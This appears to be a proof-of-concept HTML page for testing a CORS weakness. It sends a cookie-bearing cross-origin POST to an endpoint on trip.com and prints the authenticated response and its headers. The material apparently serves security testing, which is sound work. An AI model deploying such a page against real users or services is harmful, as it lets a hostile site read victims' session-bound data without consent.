<!DOCTYPE html>
<html>
<body>

<h1>CORS Chain Test</h1>
<pre id="result"></pre>

<script>

const result = document.getElementById("result");

fetch("https://chloro.trip.com/v2/d", {
    method: "POST",
    credentials: "include",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    },
    body: new URLSearchParams({
        version: "11",
        serverName: "anonymous56430.github.io",
        guid: ""
    })
})

.then(async r => {
    const text = await r.text();

    result.textContent =
        "Status: " + r.status +
        "\n\n" +
        text;

    console.log("Headers:");
    console.log([...r.headers.entries()]);

})

.catch(err => {
    result.textContent = "ERROR:\n" + err;
});

</script>

</body>
</html>
